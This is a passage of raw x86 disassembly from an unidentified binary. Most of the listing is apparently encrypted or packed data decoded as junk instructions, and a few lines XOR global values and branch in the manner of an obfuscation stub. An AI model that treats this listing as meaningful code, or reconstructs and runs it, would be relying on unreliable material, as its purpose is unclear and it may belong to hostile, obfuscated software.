  40e6d9:	adc    BYTE PTR [esp+ecx*4+0x42b4529d],al
  40e6e0:	xchg   ecx,eax
  40e6e1:	pop    ss
  40e6e2:	leave  
  40e6e3:	popf   
  40e6e4:	(bad)  
  40e6e5:	fistp  DWORD PTR [ecx+0x5911326c]
  40e6eb:	icebp  
  40e6ec:	xlat   BYTE PTR ds:[ebx]
  40e6ed:	ja     0x40e695
  40e6ef:	xchg   edx,eax
  40e6f0:	mul    DWORD PTR [ecx-0x5]
  40e6f3:	mov    ebx,0x8d018973
  40e6f8:	fimul  DWORD PTR ds:0x8a86bee
  40e6fe:	sti    
  40e6ff:	ja     0x40e760
  40e701:	loop   0x40e715
  40e703:	inc    esi
  40e704:	push   ecx
  40e705:	test   al,0x48
  40e707:	sub    ecx,DWORD PTR [ebx-0x1]
  40e70a:	push   ss
  40e70b:	jno    0x40e775
  40e70d:	mov    BYTE PTR [eax+0x520a6426],ch
  40e713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e714:	(bad)
  40e718:	inc    eax
  40e719:	jo     0x40e6b1
  40e71b:	cld    
  40e71c:	shl    DWORD PTR [edx],1
  40e71e:	ins    DWORD PTR es:[edi],dx
  40e71f:	ins    BYTE PTR es:[edi],dx
  40e720:	dec    edi
  40e721:	fs inc edx
  40e723:	nop
  40e724:	fdivr  DWORD PTR [ecx-0x34]
  40e727:	xor    ah,al
  40e729:	xchg   ecx,eax
  40e72a:	mov    bl,cl
  40e72c:	into   
  40e72d:	das    
  40e72e:	sub    al,0x41
  40e730:	jmp    0xa141:0x8fdc4db6
  40e737:	jbe    0x40e6e0
  40e739:	sti    
  40e73a:	hlt    
  40e73b:	adc    DWORD PTR [edi+0x675dd545],0x2ff3697a
  40e745:	lods   al,BYTE PTR ds:[esi]
  40e746:	push   gs
  40e748:	cmp    al,0x1
  40e74a:	cs dec esp
  40e74c:	inc    edi
  40e74d:	jns    0x40e716
  40e74f:	add    al,0x2d
  40e751:	push   esp
  40e752:	sbb    cl,BYTE PTR [esp+edi*8-0x6b4c5ca1]
  40e759:	inc    edx
  40e75a:	sub    dl,dh
  40e75c:	(bad)  
  40e75d:	jmp    0x40e7bb
  40e75f:	cdq    
  40e760:	out    dx,al
  40e761:	repnz dec ebp
  40e763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e764:	leave  
  40e765:	les    eax,FWORD PTR [eax-0x64737f43]
  40e76b:	pushf  
  40e76c:	int3   
  40e76d:	mov    dh,0x74
  40e76f:	jno    0x40e760
  40e771:	mov    ds:0x68c9387,al
  40e776:	and    DWORD PTR [ebp-0x223fdc31],esp
  40e77c:	imul   edx,DWORD PTR [edx-0x5e442bb8],0x148ad3c6
  40e786:	jnp    0x40e78f
  40e788:	lds    ebp,FWORD PTR [esi-0x46]
  40e78b:	in     eax,0xd4
  40e78d:	sbb    BYTE PTR [ebx+0x3ce3465],al
  40e793:	fcomp  DWORD PTR [ecx-0x4]
  40e796:	hlt    
  40e797:	iret   
  40e798:	(bad)  
  40e799:	push   esi
  40e79a:	pop    eax
  40e79b:	mov    dh,0xd3
  40e79d:	or     BYTE PTR [ecx-0xb],ah
  40e7a0:	arpl   di,di
  40e7a2:	scas   al,BYTE PTR es:[edi]
  40e7a3:	cmc    
  40e7a4:	call   0x90fe1f7a
  40e7a9:	ret    
  40e7aa:	das    
  40e7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ad:	aas    
  40e7ae:	shl    DWORD PTR [ebx],1
  40e7b0:	nop
  40e7b1:	sti    
  40e7b2:	or     dh,BYTE PTR [ebx-0x1f]
  40e7b5:	pop    edx
  40e7b6:	cmp    DWORD PTR [edi],edi
  40e7b8:	xor    dh,BYTE PTR [edi+0x46]
  40e7bb:	add    al,0x7
  40e7bd:	es xchg esi,eax
  40e7bf:	into   
  40e7c0:	xor    DWORD PTR [esi],ebx
  40e7c2:	mov    al,ds:0x69cc17c1
  40e7c7:	fcmovnb st,st(7)
  40e7c9:	inc    ebx
  40e7cb:	or     ah,BYTE PTR [eax]
  40e7cd:	adc    esp,DWORD PTR [edx+0x51ca151c]
  40e7d3:	cmp    bl,cl
  40e7d5:	xchg   edi,eax
  40e7d6:	sub    DWORD PTR [eax+0x6],ecx
  40e7d9:	add    eax,0x27bcdd03
  40e7de:	inc    edx
  40e7df:	ss scas al,BYTE PTR es:[edi]
  40e7e1:	test   DWORD PTR [edx],eax
  40e7e3:	xor    al,0x5e
  40e7e5:	int    0xe2
  40e7e7:	fs mov esi,0x401ed203
  40e7ed:	sub    eax,0xb81df0f2
  40e7f2:	mov    al,0xd6
  40e7f4:	inc    eax
  40e7f5:	retf   0x874b
  40e7f8:	and    DWORD PTR [ebx],ebp
  40e7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fb:	popf   
  40e7fc:	pop    esp
  40e7fd:	ret    
  40e7fe:	add    dl,BYTE PTR [ebx+0x4a]
  40e801:	out    0x8a,al
  40e803:	jle    0xd63f2ac3
  40e809:	push   ebp
  40e80a:	out    dx,al
  40e80b:	leave  
  40e80c:	mov    esi,0xe8932b78
  40e811:	xor    DWORD PTR [ebx-0x645cb47e],eax
  40e817:	and    al,0x11
  40e819:	push   cs
  40e81a:	adc    al,0x89
  40e81c:	xchg   esi,eax
  40e81d:	imul   edi,DWORD PTR [ebp-0x7e],0x618545ec
  40e824:	and    BYTE PTR [edx-0x5a69d2e6],bh
  40e82a:	cmp    eax,eax
  40e82c:	cmp    ecx,DWORD PTR [eax]
  40e82e:	mov    al,0xc3
  40e830:	or     al,0x76
  40e832:	sub    DWORD PTR ds:0xd50eb3f4,esp
  40e838:	push   es
  40e839:	xor    bl,dh
  40e83b:	sar    DWORD PTR [ebx+ecx*1-0x1a],1
  40e83f:	scas   al,BYTE PTR es:[edi]
  40e840:	inc    ebp
  40e841:	pop    ds
  40e842:	xchg   edx,eax
  40e843:	mov    cl,0xad
  40e845:	xor    eax,0x9d93059
  40e84a:	shl    DWORD PTR [edi+ebp*2-0x1dd74944],0x7
  40e852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e853:	aas    
  40e854:	test   DWORD PTR [esi-0x37],ebx
  40e857:	stc    
  40e858:	sbb    ecx,ebp
  40e85a:	fiadd  WORD PTR [esi+0x5182d1ea]
  40e860:	sar    BYTE PTR ds:0x4fb67e85,cl
  40e866:	int    0x4b
  40e868:	inc    ecx
  40e869:	xor    esi,DWORD PTR [ecx+0xf07c331]
  40e86f:	retf   
  40e870:	xchg   ebp,eax
  40e871:	pop    ds
  40e872:	fcmovne st,st(0)
  40e874:	pushf  
  40e875:	dec    edi
  40e876:	push   es
  40e877:	fld    TBYTE PTR [ecx-0x11]
  40e87a:	jo     0x40e829
  40e87c:	dec    ecx
  40e87d:	cmp    eax,0x805b16e3
  40e882:	ins    DWORD PTR es:[edi],dx
  40e883:	bound  esp,QWORD PTR [eax+0x46]
  40e886:	clc    
  40e887:	push   esi
  40e888:	fneni(8087 only) 
  40e88a:	fnstcw WORD PTR [esi]
  40e88c:	or     DWORD PTR [ecx],esi
  40e88e:	neg    BYTE PTR [ebx+edx*4-0x7b]
  40e892:	and    bl,bl
  40e894:	xchg   edx,eax
  40e895:	pop    esp
  40e896:	dec    ebx
  40e897:	or     DWORD PTR [eax],edx
  40e899:	dec    ecx
  40e89a:	repz std 
  40e89c:	mov    ecx,DWORD PTR [ebp-0x20]
  40e89f:	mov    esi,DWORD PTR ds:0x434355
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43429e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4342a2,0x4325ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432cc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434311,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432cc2,0x4325f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fiadd  DWORD PTR [esi]
  40e903:	and    eax,ebx
  40e905:	ins    BYTE PTR es:[edi],dx
  40e906:	sub    ebx,DWORD PTR [edx+0x7d497070]
  40e90c:	jo     0x40e97e
  40e90e:	mov    bh,0x56
  40e910:	jle    0x40e916
  40e912:	stos   DWORD PTR es:[edi],eax
  40e913:	inc    esi
  40e914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e915:	aam    0xab
  40e917:	xlat   BYTE PTR ds:[ebx]
  40e918:	jge    0x40e8d0
  40e91a:	out    0xbe,eax
  40e91c:	xchg   ecx,eax
  40e91d:	jecxz  0x40e8c4
  40e91f:	ficom  DWORD PTR [eax-0x1b]
  40e922:	pushf  
  40e923:	or     bh,BYTE PTR ds:0x56d014fa
  40e929:	cs cmc 
  40e92b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e92c:	sub    al,BYTE PTR gs:[eax-0x228e851c]
  40e933:	push   0xec196fae
  40e938:	xlat   BYTE PTR ds:[ebx]
  40e939:	mov    eax,0x82e5ac9f
  40e93e:	shl    DWORD PTR [edx+edi*8],0xf5
  40e942:	nop
  40e943:	xchg   ecx,eax
  40e944:	neg    DWORD PTR [ebp+edx*1-0x28]
  40e948:	test   DWORD PTR [eax],ecx
  40e94a:	jge    0x40e999
  40e94c:	jecxz  0x40e8f5
  40e94e:	inc    ecx
  40e94f:	jmp    0xf6680fbc
  40e954:	jecxz  0x40e9b7
  40e956:	outs   dx,DWORD PTR ds:[esi]
  40e957:	adc    eax,0x1ea07717
  40e95c:	in     al,dx
  40e95d:	ss pusha 
  40e95f:	addr16 pop ecx
  40e961:	out    0x5b,al
  40e963:	jns    0x40e998
  40e965:	(bad)  
  40e967:	lds    esp,FWORD PTR [edx+0x1dc081cb]
  40e96d:	and    esp,DWORD PTR [esi]
  40e96f:	xlat   BYTE PTR ds:[ebx]
  40e970:	jnp    0x40e9aa
  40e972:	loop   0x40e9c3
  40e974:	test   eax,0xc67e7809
  40e979:	cld    
  40e97a:	mov    edx,0x4fe9e14
  40e97f:	adc    al,0x19
  40e981:	jae    0x40e978
  40e983:	stos   BYTE PTR es:[edi],al
  40e984:	hlt    
  40e985:	(bad)  [edx+ecx*1]
  40e988:	aaa    
  40e989:	jno    0x40e96e
  40e98b:	jne    0x40e923
  40e98d:	push   edi
  40e98e:	adc    bl,al
  40e990:	mov    esp,0x92c287f9
  40e995:	pop    es
  40e996:	add    al,0x46
  40e998:	outs   dx,BYTE PTR ds:[esi]
  40e999:	sbb    ebx,DWORD PTR [ebx-0x49]
  40e99c:	xor    esi,edi
  40e99e:	neg    DWORD PTR [edi+0x56]
  40e9a1:	bound  esp,QWORD PTR [esi-0x5552bfd0]
  40e9a7:	mov    esi,0x505e2d7f
  40e9ac:	dec    edi
  40e9ad:	test   edi,ebx
  40e9af:	inc    esi
  40e9b0:	cwde   
  40e9b1:	repnz ins DWORD PTR es:[edi],dx
  40e9b3:	cli    
  40e9b4:	mov    bl,0xc7
  40e9b6:	test   DWORD PTR [edi+0x5a],ebx
  40e9b9:	cmp    dl,BYTE PTR [ecx-0x12eddb1]
  40e9bf:	cmp    al,BYTE PTR [ebx]
  40e9c1:	lods   al,BYTE PTR ds:[esi]
  40e9c2:	retf   0xca6d
  40e9c5:	repz mov edi,0x156dd55e
  40e9cb:	inc    edx
  40e9cc:	add    al,BYTE PTR [eax-0x2396ecaa]
  40e9d2:	mul    DWORD PTR [eax+0x7112bccc]
  40e9d8:	push   ds
  40e9d9:	mov    al,ds:0x7195db51
  40e9de:	push   es
  40e9df:	mov    esi,DWORD PTR [edx+esi*1]
  40e9e2:	sub    al,0x57
  40e9e4:	sub    bh,dl
  40e9e6:	das    
  40e9e7:	es out dx,al
  40e9e9:	mov    WORD PTR [esi+0x58],?
  40e9ec:	jmp    0xef85:0xa2551d2b
  40e9f3:	or     ah,bh
  40e9f5:	push   0xafa463ad
  40e9fa:	test   ch,bh
  40e9fc:	rol    ch,0x71
  40e9ff:	xchg   BYTE PTR [ebp+0x25],dh
  40ea02:	sbb    dh,BYTE PTR [ecx]
  40ea04:	aad    0x9
  40ea06:	push   esi
  40ea07:	rol    BYTE PTR [ecx-0x22],0x33
  40ea0b:	bound  edx,QWORD PTR [edx]
  40ea0d:	jle    0x40e9d1
  40ea0f:	clc    
  40ea10:	in     al,dx
  40ea11:	addps  xmm3,XMMWORD PTR [edx]
  40ea14:	ret    0xeb89
  40ea17:	fwait
  40ea18:	add    esp,esp
  40ea1a:	lods   eax,DWORD PTR ds:[esi]
  40ea1b:	int3   
  40ea1c:	sbb    DWORD PTR [edx+0x1f9a630e],0xebab36e5
  40ea26:	hlt    
  40ea27:	xor    ecx,DWORD PTR [eax+0x67e7a4a3]
  40ea2d:	shl    BYTE PTR [ebp+0xc],cl
  40ea30:	mov    ecx,0xbb1bdcf6
  40ea35:	sbb    eax,0x646cf8a8
  40ea3a:	jmp    0xb007:0xd4eee065
  40ea41:	(bad)  
  40ea42:	push   ss
  40ea43:	pop    ecx
  40ea44:	data16 cli 
  40ea46:	(bad)  
  40ea47:	rol    DWORD PTR [ebp+0x4d],cl
  40ea4a:	or     al,0x66
  40ea4c:	scas   al,BYTE PTR es:[edi]
  40ea4d:	test   eax,0x85a7ea27
  40ea52:	cmp    al,0xfd
  40ea54:	dec    edx
  40ea55:	shl    edi,1
  40ea57:	jnp    0x40eab9
  40ea59:	lds    ecx,FWORD PTR [ecx-0x11199ca0]
  40ea5f:	cmp    DWORD PTR [ecx-0x35],eax
  40ea62:	dec    ebp
  40ea63:	int3   
  40ea64:	inc    eax
  40ea65:	and    esi,esi
  40ea67:	dec    edi
  40ea68:	(bad)  
  40ea69:	jg     0x40ea10
  40ea6b:	jp     0x40ea56
  40ea6d:	dec    esp
  40ea6e:	or     edx,edi
  40ea70:	push   ebx
  40ea71:	mov    al,ds:0x8cde0bd
  40ea76:	jns    0x40ea8b
  40ea78:	lahf   
  40ea79:	add    edi,DWORD PTR [ebp-0x12da4e92]
  40ea7f:	jp     0x40eac4
  40ea81:	mov    edx,0x9f6f7989
  40ea86:	(bad)  
  40ea87:	sub    BYTE PTR [esi+0x73],ch
  40ea8a:	outs   dx,DWORD PTR ds:[esi]
  40ea8b:	scas   al,BYTE PTR es:[edi]
  40ea8c:	mov    bl,0xd7
  40ea8e:	sbb    dh,BYTE PTR [ebx+0x6841cb63]
  40ea94:	dec    esi
  40ea95:	xor    BYTE PTR [esp+edi*1],0x7e
  40ea99:	adc    BYTE PTR [eax],ch
  40ea9b:	ret    
  40ea9c:	mov    dl,0xa0
  40ea9e:	or     DWORD PTR [edi],ecx
  40eaa0:	dec    ecx
  40eaa1:	xor    BYTE PTR [ebp-0x39145051],bl
  40eaa7:	jbe    0x40ead8
  40eaa9:	jns    0x40eaf2
  40eaab:	aas    
  40eaac:	ins    BYTE PTR es:[edi],dx
  40eaad:	cs add dh,ah
  40eab0:	cmp    ah,BYTE PTR [ebx-0x67]
  40eab3:	or     cl,BYTE PTR [esi]
  40eab5:	fmulp  st(1),st
  40eab7:	inc    esi
  40eab8:	out    dx,eax
  40eab9:	lock pop ds
  40eabb:	cmp    eax,0x51e33311
  40eac0:	adc    eax,0x27c3fc72
  40eac5:	fdiv   QWORD PTR [esi]
  40eac7:	dec    ebp
  40eac8:	int3   
  40eac9:	sbb    al,0x6a
  40eacb:	shl    esi,0x2b
  40eace:	push   edx
  40eacf:	data16 or ch,0x1d
  40ead3:	sbb    edx,DWORD PTR [eax+eiz*8]
  40ead6:	test   eax,0x148ff348
  40eadb:	sub    ch,BYTE PTR cs:[edx+edi*2-0x2df3a4e3]
  40eae3:	xor    ah,BYTE PTR [ecx-0xd8f7c14]
  40eae9:	push   ss
  40eaea:	dec    edx
  40eaeb:	cmp    esp,esi
  40eaed:	(bad)  
  40eaee:	retf   0x7739
  40eaf1:	jo     0x40eb14
  40eaf3:	ins    BYTE PTR es:[edi],dx
  40eaf4:	push   edi
  40eaf5:	adc    dl,BYTE PTR [edi-0x7dc84225]
  40eafb:	and    DWORD PTR [edi],0x4bc63ac4
  40eb01:	cmp    eax,0xf9d8719e
  40eb06:	nop
  40eb07:	ficomp WORD PTR [edx-0x11]
  40eb0a:	call   0xc97c82a3
  40eb0f:	loope  0x40ea9c
  40eb11:	pop    esp
  40eb12:	ins    DWORD PTR es:[edi],dx
  40eb13:	jns    0x40eace
  40eb15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb16:	(bad)  
  40eb18:	xchg   BYTE PTR [edi-0x24],al
  40eb1b:	sub    eax,0x20fffef6
  40eb20:	sbb    eax,0x9fb011ff
  40eb25:	mov    ebp,0x4c913a4e
  40eb2a:	pusha  
  40eb2b:	ja     0x40ebac
  40eb2d:	jmp    0x3d11bc0
  40eb32:	inc    eax
  40eb33:	jno    0x40eb94
  40eb35:	ja     0x40eb99
  40eb37:	in     al,dx
  40eb38:	imul   esp,DWORD PTR [esi+0x25],0x6d
  40eb3c:	cmp    DWORD PTR [esi],ebx
  40eb3e:	scas   eax,DWORD PTR es:[edi]
  40eb3f:	call   0xfb27bc54
  40eb44:	and    eax,0x452f7547
  40eb49:	adc    eax,0x63380fcd
  40eb4e:	add    al,0x8b
  40eb50:	push   eax
  40eb51:	sbb    ecx,ebp
  40eb53:	call   0x902b:0x12e8e8c5
  40eb5a:	pop    esi
  40eb5b:	jle    0x40eaf4
  40eb5d:	pop    ebp
  40eb5e:	cmp    bh,BYTE PTR [esi-0x21]
  40eb61:	mov    ecx,0x23a598bb
  40eb66:	xchg   ecx,eax
  40eb67:	jno    0x40eb15
  40eb69:	inc    esi
  40eb6a:	aad    0x6b
  40eb6c:	es pop ds
  40eb6e:	jge    0x40ebd7
  40eb70:	push   eax
  40eb71:	loop   0x40eb6d
  40eb73:	add    al,0x10
  40eb75:	pop    edi
  40eb76:	push   0x2
  40eb78:	ja     0x40eb2a
  40eb7a:	sbb    ebx,DWORD PTR [edi+0x69]
  40eb7d:	ins    BYTE PTR es:[edi],dx
  40eb7e:	pushf  
  40eb7f:	xor    cl,BYTE PTR [ebp-0x2d56a0c7]
  40eb85:	mov    ebp,0xc2353682
  40eb8a:	mov    cl,BYTE PTR [ebx]
  40eb8c:	aad    0xdd
  40eb8e:	jmp    0x777c4f7
  40eb93:	dec    ebp
  40eb94:	mov    ch,0xc0
  40eb96:	imul   esp,esi,0x655abd87
  40eb9c:	(bad)
  40eba0:	pop    esi
  40eba1:	jb     0x40ebb2
  40eba3:	mov    ecx,0x90c992f
  40eba8:	mov    ds:0xbce63555,al
  40ebad:	fwait
  40ebae:	(bad)  
  40ebaf:	and    eax,0xc485b341
  40ebb4:	shl    BYTE PTR [ebp-0x35bcf43b],cl
  40ebba:	fs pushf 
  40ebbc:	push   ss
  40ebbd:	aam    0xbf
  40ebbf:	mov    dh,0x22
  40ebc1:	dec    ebx
  40ebc2:	mov    esi,0x426a0bf4
  40ebc7:	pop    ss
  40ebc8:	pop    ebp
  40ebc9:	inc    ebx
  40ebca:	dec    ecx
  40ebcb:	les    ebp,FWORD PTR [ecx-0x2e]
  40ebce:	or     cl,BYTE PTR [ebp+eiz*2+0x78]
  40ebd2:	rcr    DWORD PTR [edi],1
  40ebd4:	dec    ebx
  40ebd5:	xlat   BYTE PTR ds:[ebx]
  40ebd6:	jo     0x40ebe0
  40ebd8:	and    eax,0x5aeeda20
  40ebdd:	jae    0x40ec01
  40ebdf:	jp     0x40eb6c
  40ebe1:	mov    ebp,0x4ad78834
  40ebe6:	sbb    BYTE PTR [ecx-0x4c],ah
  40ebe9:	daa    
  40ebea:	sbb    edi,eax
  40ebec:	fist   WORD PTR [ebx]
  40ebee:	lds    ebp,FWORD PTR [ebp-0x3676ac67]
  40ebf4:	pop    es
  40ebf5:	inc    edi
  40ebf6:	sub    al,0x70
  40ebf8:	arpl   WORD PTR [ebp+0xf],ax
  40ebfb:	add    BYTE PTR [ebx-0xf404f60],0xf3
  40ec02:	out    0xa6,al
  40ec04:	xchg   esp,eax
  40ec05:	ror    BYTE PTR [edi+0x34],0x59
  40ec09:	fidivr WORD PTR [esi+0x1c]
  40ec0c:	(bad)  
  40ec0e:	rol    edx,1
  40ec10:	shl    al,cl
  40ec12:	stos   DWORD PTR es:[edi],eax
  40ec13:	enter  0x5979,0x35
  40ec17:	fcos   
  40ec19:	xchg   ebp,eax
  40ec1a:	sbb    al,0xd1
  40ec1c:	inc    eax
  40ec1d:	es retf 0xb112
  40ec21:	test   BYTE PTR [edx+eiz*4-0x71],cl
  40ec25:	aas    
  40ec26:	data16 sbb BYTE PTR [ecx-0x46],0xd6
  40ec2b:	sub    eax,0xe7beb08b
  40ec30:	jle    0x40ec8f
  40ec32:	jbe    0x40ebcb
  40ec34:	push   edi
  40ec35:	push   ebx
  40ec36:	xchg   BYTE PTR ds:0x5a9d0149,cl
  40ec3c:	sbb    al,0x51
  40ec3e:	jg     0x40ebc6
  40ec40:	pushf  
  40ec41:	out    dx,al
  40ec42:	sub    al,0x69
  40ec44:	mov    esi,0xf47ba769
  40ec49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec4a:	push   ds
  40ec4b:	xchg   edx,eax
  40ec4c:	or     bl,dl
  40ec4e:	fst    QWORD PTR [ebp+0x37dfcc80]
  40ec54:	pcmpgtb mm2,QWORD PTR [esi+eiz*1]
  40ec58:	rol    BYTE PTR [ebx+eiz*8+0x59],cl
  40ec5c:	mov    esi,0xd91026b4
  40ec61:	arpl   WORD PTR [ebp+0x7dd21178],bp
  40ec67:	fstp   QWORD PTR [ebx]
  40ec69:	fbstp  TBYTE PTR [ecx]
  40ec6b:	mov    es:0xc1ee55ae,al
  40ec71:	xchg   edx,eax
  40ec72:	lods   eax,DWORD PTR ds:[esi]
  40ec73:	inc    ecx
  40ec74:	shl    DWORD PTR ds:0xd3c6eed1,cl
  40ec7a:	and    BYTE PTR [edi],dl
  40ec7c:	(bad)  
  40ec7d:	daa    
  40ec7e:	add    dl,BYTE PTR [esi]
  40ec80:	sbb    al,0x8a
  40ec82:	ds call 0x5432ee96
  40ec88:	(bad)  [esi-0x7f]
  40ec8b:	fld    st(3)
  40ec8d:	js     0x40ec3c
  40ec8f:	mov    ecx,0xa3c1ddb2
  40ec94:	in     eax,dx
  40ec95:	frstor [ecx+0x608a8aa8]
  40ec9b:	iret   
  40ec9c:	push   eax
  40ec9d:	mov    esp,0x8cf46d17
  40eca2:	repz pop es
  40eca4:	loop   0x40ec93
  40eca6:	daa    
  40eca7:	(bad)  
  40eca8:	fistp  QWORD PTR [ecx-0x27b8c06a]
  40ecae:	dec    ecx
  40ecaf:	adc    al,0xd
  40ecb1:	push   0xffffffae
  40ecb3:	inc    ebx
  40ecb4:	jb     0x40ec81
  40ecb6:	cmp    DWORD PTR es:[edx],edx
  40ecb9:	fist   DWORD PTR [ecx]
  40ecbb:	sar    BYTE PTR [ebx+0x7d9ed3b1],cl
  40ecc1:	hlt    
  40ecc2:	push   edx
  40ecc3:	add    WORD PTR [edi+0x1ac36416],dx
  40ecca:	sub    eax,0xee4ab345
  40eccf:	jg     0x40ec72
  40ecd1:	idiv   BYTE PTR [edi]
  40ecd3:	lods   eax,DWORD PTR ds:[esi]
  40ecd4:	mov    ah,BYTE PTR [edi-0x24668854]
  40ecda:	sbb    bl,BYTE PTR [eax-0x210c4a4c]
  40ece0:	sar    DWORD PTR [edi],1
  40ece2:	push   0x458913e3
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx-0x64b04189],eax
  40ed29:	xor    al,BYTE PTR [esi+eiz*4]
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ecc5
  40ed33:	icebp  
  40ed34:	das    
  40ed35:	xchg   esp,eax
  40ed36:	push   ebx
  40ed37:	xchg   ecx,eax
  40ed38:	sub    al,0x51
  40ed3a:	repz ret 0xcae4
  40ed3e:	je     0x40edbe
  40ed40:	loopne 0x40ed90
  40ed42:	push   esi
  40ed43:	add    ah,BYTE PTR [eax+0x7464505f]
  40ed49:	add    eax,0x3c3f982f
  40ed4e:	test   al,0xc0
  40ed50:	test   al,0x31
  40ed52:	inc    ebp
  40ed53:	xor    eax,ecx
  40ed55:	jl     0x40ed86
  40ed57:	jecxz  0x40ed1c
  40ed59:	jmp    0x40ed87
  40ed5b:	sbb    ecx,DWORD PTR [esi+0x138965b5]
  40ed61:	push   edi
  40ed62:	enter  0x6d70,0x5
  40ed66:	not    ch
  40ed68:	in     eax,0x9a
  40ed6a:	sub    eax,0xedadabe6
  40ed6f:	aad    0x83
  40ed71:	div    cl
  40ed73:	and    DWORD PTR [edi+0x7a],ebp
  40ed76:	or     dl,BYTE PTR [edx-0x5c]
  40ed79:	data16 test BYTE PTR [ebx-0x320e81f5],dh
  40ed80:	shr    DWORD PTR [esi-0x6d54916f],cl
  40ed86:	out    dx,eax
  40ed87:	dec    ebp
  40ed88:	aam    0x2e
  40ed8a:	pushf  
  40ed8b:	loopne 0x40ed76
  40ed8d:	mov    edi,0x6d761b83
  40ed92:	ror    esi,1
  40ed94:	test   BYTE PTR [edx-0x75f0ea8e],bl
  40ed9a:	sbb    eax,0x642a6f8c
  40ed9f:	iret   
  40eda0:	xlat   BYTE PTR ds:[ebx]
  40eda1:	lock jbe 0x40ed88
  40eda4:	push   esp
  40eda5:	xor    eax,0xefac903e
  40edaa:	fld    DWORD PTR [edi-0x34b8bfd2]
  40edb0:	popf   
  40edb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb2:	jno    0x40ee29
  40edb4:	and    BYTE PTR [ebx+edi*2-0x15216337],al
  40edbb:	loope  0x40ede5
  40edbd:	inc    esp
  40edbe:	and    ebx,DWORD PTR [edx+0x60]
  40edc1:	push   0x85fd1c14
  40edc6:	inc    edx
  40edc7:	into   
  40edc8:	sub    al,0xda
  40edca:	dec    ebp
  40edcb:	pop    ebp
  40edcc:	mov    al,ds:0xe44c9d77
  40edd1:	jne    0x40ed9a
  40edd3:	jmp    0x40ed8d
  40edd5:	push   esp
  40edd6:	mov    ebx,0x31331aaf
  40eddb:	sti    
  40eddc:	or     BYTE PTR [ebx],cl
  40edde:	dec    edi
  40eddf:	dec    ebx
  40ede0:	fadd   DWORD PTR [edx+0x58ee4555]
  40ede6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ede7:	cdq    
  40ede8:	sub    eax,0x5f368d70
  40eded:	ret    
  40edee:	jne    0x40edf1
  40edf0:	cmp    BYTE PTR [ecx],ah
  40edf2:	mov    cl,0x8
  40edf4:	mov    es,WORD PTR [edx]
  40edf6:	lods   al,BYTE PTR ds:[esi]
  40edf7:	sahf   
  40edf8:	test   DWORD PTR [edx],edx
  40edfa:	(bad)  [edi-0x313c3d76]
  40ee00:	push   ebx
  40ee01:	sub    dh,BYTE PTR [ebx-0xc54fffd]
  40ee07:	mov    ds:0xef2d4c5e,al
  40ee0c:	(bad)  
  40ee0d:	lock cli 
  40ee0f:	jle    0x40ee5e
  40ee11:	aam    0x9a
  40ee13:	idiv   BYTE PTR [edi+ebx*8]
  40ee16:	mov    DWORD PTR [esi-0x43c1f4f0],ebp
  40ee1c:	pop    eax
  40ee1d:	inc    ebp
  40ee1e:	imul   ebp,DWORD PTR [ecx],0x3c
  40ee21:	test   BYTE PTR [ebx+0x2],dh
  40ee24:	or     dh,BYTE PTR [ebx+eax*2-0x2e09adbc]
  40ee2b:	jnp    0x40ee8b
  40ee2d:	nop
  40ee2e:	outs   dx,DWORD PTR ds:[esi]
  40ee2f:	dec    ebx
  40ee30:	inc    ecx
  40ee31:	or     ah,bl
  40ee33:	push   es
  40ee34:	dec    ecx
  40ee35:	ds adc eax,0x44529cb5
  40ee3b:	(bad)  
  40ee3c:	mov    al,ds:0xb4b4ce39
  40ee41:	sbb    DWORD PTR [esp+ebp*4+0x34],edi
  40ee45:	pop    esi
  40ee46:	jmp    0x40ee58
  40ee48:	add    al,0xb9
  40ee4a:	pop    esp
  40ee4b:	int    0x1b
  40ee4d:	inc    esi
